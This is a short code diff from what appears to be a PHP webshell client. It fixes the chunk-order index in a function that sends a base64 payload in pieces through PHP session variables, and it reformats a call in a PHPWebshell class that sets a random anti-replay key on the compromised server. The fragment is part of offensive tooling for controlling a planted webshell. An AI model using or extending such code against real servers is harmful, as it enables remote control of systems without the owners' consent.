@@ -297,7 +297,7 @@ def to_sessionize_payload(
     for i in range(0, len(payload), chunk):
         part = payload[i : i + chunk]
         part = (
-            PAYLOAD_SESSIONIZE.replace("PAYLOAD_ORDER", str(i))
+            PAYLOAD_SESSIONIZE.replace("PAYLOAD_ORDER", str(i // chunk))
             .replace("B64_PART", part)
             .replace("PAYLOAD_STORE", payload_store_name)
         )
@@ -709,7 +709,9 @@ class PHPWebshell(PHPSessionInterface):
         @functools.wraps(submitter)
         async def wrap(payload: str) -> str:
             session_name = f"replay_key_{uuid.uuid4()}"
-            key = await submitter(f"decoder_echo(($_SESSION[{session_name!r}]=rand()%10000).'');")
+            key = await submitter(
+                f"decoder_echo(($_SESSION[{session_name!r}]=rand()%10000).'');"
+            )
             try:
                 key = int(key)
             except Exception as exc:
